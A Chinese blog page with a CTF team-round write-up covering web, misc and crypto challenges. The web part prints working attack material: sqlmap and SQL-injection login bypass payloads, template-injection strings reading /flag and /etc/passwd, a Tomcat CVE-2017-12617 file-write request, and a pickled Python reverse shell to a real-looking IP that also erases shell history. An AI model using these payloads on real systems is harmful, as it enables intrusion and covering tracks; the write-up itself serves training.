<!DOCTYPE html>


  <html class="light page-post">


<head>
  <meta charset="utf-8">
  
  <title>首届新疆网络安全知识技能竞赛(团体赛) | xjseck&#39;s Home</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="CTF,比赛," />
  

  <meta name="description" content="前言第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。 团体解题晋级赛有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。 Web reveng">
<meta name="keywords" content="CTF,比赛">
<meta property="og:type" content="article">
<meta property="og:title" content="首届新疆网络安全知识技能竞赛(团体赛)">
<meta property="og:url" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/index.html">
<meta property="og:site_name" content="xjseck&#39;s Home">
<meta property="og:description" content="前言第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。 团体解题晋级赛有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。 Web reveng">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/score.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql1.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql2.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql3.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/sql5.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/p.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/p1.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/p2.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/upload.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/upload1.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/cap.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/cap1.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/cap2.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/cap4.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/qu.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/qu1.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/qu2.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/qu3.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/base.png">
<meta property="og:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/story.png">
<meta property="og:updated_time" content="2018-09-22T05:01:53.790Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="首届新疆网络安全知识技能竞赛(团体赛)">
<meta name="twitter:description" content="前言第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。 团体解题晋级赛有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。 Web reveng">
<meta name="twitter:image" content="https://www.xjseck.com/2018/09/13/首届新疆网络安全知识技能竞赛-团体赛/score.png">

  

  
    <link rel="icon" href="/favicon.ico">
  

  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">


  
    <link rel="stylesheet" href="/css/personal-style.css">
  

  

  
  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


  
  <script type="text/javascript">
	(function(){
	    var bp = document.createElement('script');
	    var curProtocol = window.location.protocol.split(':')[0];
	    if (curProtocol === 'https') {
	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
	    }
	    else {
	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
	    }
	    var s = document.getElementsByTagName("script")[0];
	    s.parentNode.insertBefore(bp, s);
	})();
  </script>



  
    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
  
</head>

<body>


  
    <span id="toolbox-mobile" class="toolbox-mobile">导航</span>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">导航</span>
      <i class="icon-angle-down"></i>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/archives/"
            rel="noopener noreferrer"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/category/"
            rel="noopener noreferrer"
            target="_self"
            >
            分类
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/tag/"
            rel="noopener noreferrer"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/link/"
            rel="noopener noreferrer"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a
            class="ROUND_RECT"
            href="/about/"
            rel="noopener noreferrer"
            target="_self"
            >
            关于
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#团体解题晋级赛"><span class="toc-text">团体解题晋级赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#步骤"><span class="toc-text">[步骤]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">[分析]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码"><span class="toc-text">密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#undefined"><span class="toc-text">密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#个人和团体的re-pwn解题汇总"><span class="toc-text">个人和团体的re+pwn解题汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#re"><span class="toc-text">re</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-首届新疆网络安全知识技能竞赛-团体赛" class="article article-type-post" itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">首届新疆网络安全知识技能竞赛(团体赛)</h1>

    <div class="article-meta">
      <span>
        <i class="icon-calendar"></i>
        <span>2018.09.13</span>
      </span>

      
        <span class="article-author">
          <i class="icon-user"></i>
          <span>xjseck</span>
        </span>
      

      
  <span class="article-category">
    <i class="icon-list"></i>
    <a class="article-category-link" href="/categories/比赛/">比赛</a>
  </span>



      

      
      <i class="fa fa-eye"></i> 
        <span id="busuanzi_container_page_pv">
           &nbsp热度 <span id="busuanzi_value_page_pv">
           <i class="fa fa-spinner fa-spin"></i></span>℃
        </span>
      

      
        <i class="icon-comment"></i> 
        <span class="ds-thread-count" data-thread-key="post-首届新疆网络安全知识技能竞赛-团体赛"><i class="fa fa-spinner fa-spin"></i></span> 条评论
      
      
    </div>
  </header>

  <div class="article-content">
    
      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一天经历了个人解题晋级赛之后，第二天就是团体的解题赛，这一天管理相对第一天比较严一些，进行手机的提交要求，第一天虽然也提交了，明显还是有人使用手机开了热点。这一天的刷题还算是比较顺利，web题目就一道大家都没有解出来之外，其他的也全部搞定。<br><img src="score.png" alt=""></p>
<h2 id="团体解题晋级赛"><a href="#团体解题晋级赛" class="headerlink" title="团体解题晋级赛"></a>团体解题晋级赛</h2><p>有了第一天的经历之后，这次相对的把自己的节奏和心态都稍微的进行调整，解题中相对还算是比较顺利，两个队伍都挺进了决赛。</p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul>
<li><strong>revenge_of_sql</strong><br>sql的复仇，应该是和sql注入有关，首先进行敏感目录扫描，发现.git源码泄露<br>直接githack  发现 index.php文件存在  过滤空格的盲注注入，直接sqlmap 跑数据库但是发现没有<br><img src="sql1.png" alt="sql"><br>sqlmap -r 1.txt –random-agent –dbms=mysql –tamper=space2comment.py -v 3 –sql-shell <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sql1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>admin xman  登录进入 和源码的逻辑相同没有显示<br><img src="sql2.png" alt="sql"><br>也可以手工注入登录<br><code>Username=&#39;/**/union/**/select(&#39;202cb962ac59075b964b07152d234b70&#39;)#&amp;password=123</code><br>最后分析一下git历史信息</p>
<p><img src="sql3.png" alt="sql"><br>发现有flag22222.php<br>使用sqlmap 跑一下<br><img src="sql5.png" alt="sql"></p>
<ul>
<li><strong>Web baby python</strong><br>没有啥思路，直接爆破url参数<br><img src="p.png" alt="python"><br>发现出现花括号 会出现信息的不完整输出，那应该明确了考点，就是python web的模板注入，可以直接使用函数读文件<br>也可以使用其他python 沙盒绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/flag&apos;).read() &#125;&#125;等python链进行代码的执行</span><br><span class="line">http://10.98.98.25:5554/404?msg=&apos;&#125;&#125;&#123;&#123; open(&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="p1.png" alt="python"><br><img src="p2.png" alt="python"></p>
<ul>
<li><strong>ezupload</strong><br>文件上传常规套路：直接大小写、javascript、 改后缀 、截断或这让js失效</li>
</ul>
<p><img src="upload.png" alt="upload"><br><img src="upload1.png" alt="upload"></p>
<ul>
<li><p><strong>http</strong></p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="[步骤]"></a><strong>[步骤]</strong></h2><p>访问发现提示 <code>不是本地人，不允许访问</code>， 于是修改xff为127.0.0.1或localhost伪造为本地<br>伪造后提示未登录，查看cookie发现存在login=0的键值，将0修改为1得到flag</p>
</li>
<li><p><strong>ezpentest</strong></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="[分析]"></a><strong>[分析]</strong></h2><p>这道题，没有队伍解出来，当时进行了目录的扫描，和nmap的扫描，发现了8080 端口tomcat，按题目的说明，应该是一个tomcat溢出漏洞，赛后讨论应该是<br>CVE-2017-12617(远程代码执行漏洞)影响范围:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.0.0.M1-9.0.0</span><br><span class="line"></span><br><span class="line">Apache Tomcat 8.5.0-8.5.22</span><br><span class="line"></span><br><span class="line">Apache Tomcat 8.0.0.RC1-8.0.46</span><br><span class="line"></span><br><span class="line">Apache Tomcat 7.0.0-7.0.81</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>当时没有网，也就没有找到具体的payload ，可以参考P牛的vuln库 任意文件写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure></p>
<ul>
<li><strong>Check in</strong><br>考察的是python的cPickle的反序列化漏洞</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span><span class="comment">#you should write your code in this function</span></span><br><span class="line">    <span class="keyword">import</span> socket</span><br><span class="line">    <span class="keyword">import</span> os,pty</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip,int(port)))</span><br><span class="line">        os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">        os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">        os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">        shell= <span class="string">"/bin/sh"</span></span><br><span class="line">        os.unsetenv(<span class="string">"HISTFILE"</span>)</span><br><span class="line">        os.unsetenv(<span class="string">"HISTFILESIZE"</span>)</span><br><span class="line">        os.unsetenv(<span class="string">"HISTSIZE"</span>)</span><br><span class="line">        os.unsetenv(<span class="string">"HISTORY"</span>)</span><br><span class="line">        os.unsetenv(<span class="string">"HISTSAVE"</span>)</span><br><span class="line">        os.unsetenv(<span class="string">"HISTZONE"</span>)</span><br><span class="line">        os.unsetenv(<span class="string">"HISTLOG"</span>)</span><br><span class="line">        os.unsetenv(<span class="string">"HISTCMD"</span>)</span><br><span class="line">        os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">'/dev/null'</span>)</span><br><span class="line">        os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">        os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">'0'</span>)</span><br><span class="line">        pty.spawn(shell)</span><br><span class="line">        s.close()</span><br><span class="line">    test(<span class="string">'202.112.51.130'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:<span class="comment">#尝试使用cPickle来序列号代码对象</span></span><br><span class="line">    cPickle.dumps(foo.func_code)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">print</span> e <span class="comment">#TypeError: can't pickle code objects</span></span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"><span class="keyword">print</span> code_serialized</span><br></pre></td></tr></table></figure>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a><h2>misc</h2></h3><ul>
<li><strong>流量包解密02</strong><br><img src="cap.png" alt=""><br>题目进行了说明，mac地址就是秘钥，国赛的题目也出现过，当时提取mac之后没有跑出来<br>，最会拼一下脑洞发现，爆破的时候的数据包的mac 地址就是密码<br>提示是mac，尝试提取mac不行，结果就是脑洞<br> 1  B4:0B:44:C2:D5:FF  xj                        WPA (1 handshake)<br><img src="cap1.png" alt=""><br><img src="cap2.png" alt="cap"><br>然后发现就是dns  apr 做中间人，做了个test.txt  success.txt的测试<br>就没有url了需要再次脑洞一下吧。还是那个师傅的blog<br><img src="cap4.png" alt="cap"><br>说的是url flag{<a href="http://www.wiattack.net/test.txt}" target="_blank" rel="noopener">http://www.wiattack.net/test.txt}</a></li>
</ul>
<ul>
<li><strong>如来十三掌</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>与佛论禅解密：<br><code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code><br>尝试base64解密失败，继续尝试，发现先rot13，在base64<br><code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code><br><code>flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</code></p>
<ul>
<li><p><strong>Find_your_flag</strong><br>是一个内存取证的题目<br>Volatility工具安排一下<br><img src="qu.png" alt=""><br>遍历文件找一找flag<br><img src="qu1.png" alt=""><br>导出文件发现需要密码，根据提示猜测密码可能在剪切板<br><img src="qu2.png" alt=""><br><img src="qu3.png" alt=""></p>
</li>
<li><p><strong>倍四家族</strong><br>这个题是一个7z的带密码的压缩包，想推导密码，你需要点脑洞，根据题目和压缩包，发现密码是flag字符的base64编码，解密出flag.txt<br><img src="base.png" alt=""><br>最后写一个脚本进行每一行的解密（参考官方wp）</p>
</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">  base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">  res = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s1)):</span><br><span class="line">    <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">    <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_lines = f.readlines()</span><br><span class="line"></span><br><span class="line">  bin_str = <span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">    steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">    norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">    pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">    <span class="keyword">if</span> diff:</span><br><span class="line">    bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  res_str = <span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">    res_str += chr(int(bin_str[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">  <span class="keyword">print</span> res_str</span><br><span class="line"></span><br><span class="line">solve_stego()</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">W^7?+dv|4DVs&amp;z9Wn^D$Z+2y0W?^k&lt;Y&lt;XW~X&gt;)U7bZK*DVPkY&lt;WPJ</span><br></pre></td></tr></table></figure>
<ul>
<li>猜测是base85，python跑一下</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: base64.b85decode(<span class="string">b'W^7?+dv|4DVs&amp;z9Wn^D$Z+2y0W?^k&lt;Y&lt;XW~X&gt;)U7bZK*DVPkY&lt;WPJ'</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">b'flag&#123;we_buried_love_family_dissatisfacted&#125;'</span></span><br></pre></td></tr></table></figure>
<h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a><h2>密码</h2></h3><ul>
<li><strong>short_story</strong><br>一个doc文档，字体有点高低和一个隐藏的矩阵，应该是hill加密<br><img src="story.png" alt=""></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">美国代表团访华时曾有一名官员当着周总理的面说中国人很喜欢低着头走路而我们美国人却总是抬着头走路周总理不慌不忙脸带微笑地说这并不奇怪因为我们中国人喜欢走上坡路而你们美国人喜欢走下坡路</span><br><span class="line"></span><br><span class="line">AABBBBAAABBABBAAAABBAABBBBAAABBBAAAAABBAAAABABAAAABABBAAAABBAAAABABBABABABAABABBAAAABABABA</span><br><span class="line">hrwdhrygcqwdbnklbk</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>继续从文档中获得密钥。文档末尾隐藏了一个矩阵，选中更改字体颜色后可以看到。根据这个矩阵，联想到hill加密</li>
</ol>
<p>先根据密钥矩阵计算逆矩阵，将密文按照2个2个分组，与逆矩阵右乘得到明文。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:UTF-8</span></span><br><span class="line">key = [<span class="number">-7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">-1</span>]</span><br><span class="line">m = <span class="string">"hrwdhrygcqwdbnklbk"</span></span><br><span class="line"></span><br><span class="line">c= []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(len(m)):</span><br><span class="line">    <span class="keyword">if</span>(m[x]&gt;=<span class="string">'a'</span><span class="keyword">and</span> x&lt;=<span class="string">'z'</span>):</span><br><span class="line">        <span class="keyword">print</span> ord(m[x])<span class="number">-97</span></span><br><span class="line">        c.append(ord(m[x])<span class="number">-97</span>)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"></span><br><span class="line">temp = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c),<span class="number">2</span>):</span><br><span class="line">    temp.append(chr(((key[<span class="number">0</span>] * c[i]+key[<span class="number">1</span>] * c[i+<span class="number">1</span>])%<span class="number">26</span>)+<span class="number">97</span>))</span><br><span class="line">    temp.append(chr(((key[<span class="number">2</span>] * c[i] + key[<span class="number">3</span>] * c[i+<span class="number">1</span>])%<span class="number">26</span>)+<span class="number">97</span>))</span><br><span class="line"></span><br><span class="line">temp = <span class="string">''</span>.join(temp)</span><br><span class="line"><span class="keyword">print</span> temp[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
<p>得到llihllamssihtrednu</p>
<p>题目中说“走下坡路”，所以想到字符串经过反向处理。</p>
<p>得到flag{underthissmallhill}。</p>
<ul>
<li><strong>weak_des</strong><br>给出了加密代码<br>参考0xptdg战队的py<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">ct=open(<span class="string">'ciphertext'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">KEY=libnum.n2s(<span class="number">0xe0e0e0e0f1f1f1f1</span>)</span><br><span class="line">IV=<span class="string">'13245678'</span></span><br><span class="line">a=DES.new(KEY,DES.MODE_OFB,IV)</span><br><span class="line"><span class="keyword">print</span> a.decrypt(ct)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">The furthest distance in the world</span><br><span class="line"></span><br><span class="line">Is not between life and death</span><br><span class="line">But when I stand infront of you</span><br><span class="line">Yet you don&apos;t know that I love you</span><br><span class="line"></span><br><span class="line">Is not when I stand infront of you</span><br><span class="line">Yet you can&apos;t see my love</span><br><span class="line">But when undoubtedly knowing the love from both</span><br><span class="line">Yet can not be together</span><br><span class="line"></span><br><span class="line">Is not being apart 